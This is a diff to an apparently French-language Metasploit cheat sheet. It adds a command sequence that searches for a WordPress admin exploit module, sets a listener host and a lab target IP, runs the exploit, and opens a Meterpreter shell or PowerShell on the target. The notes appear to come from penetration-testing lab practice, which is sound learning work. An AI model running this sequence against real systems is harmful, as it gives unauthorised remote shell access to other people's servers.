@@ -5,6 +5,19 @@
 ```shell
 msfconsole
 msfconsole -q # supprimer la banner
+msf > search wp_admin
+msf > use 0
+msf > options
+msf > set LHOST tun0
+msf > set RHOSTS 10.129.2.141
+msf > run/exploit # ce sont des alias
+meterpreter > shell
+# ou
+##
+meterpreter > load powershell
+meterpreter > powershell_shell
+PS >
+##
 ```
 
 ## Install
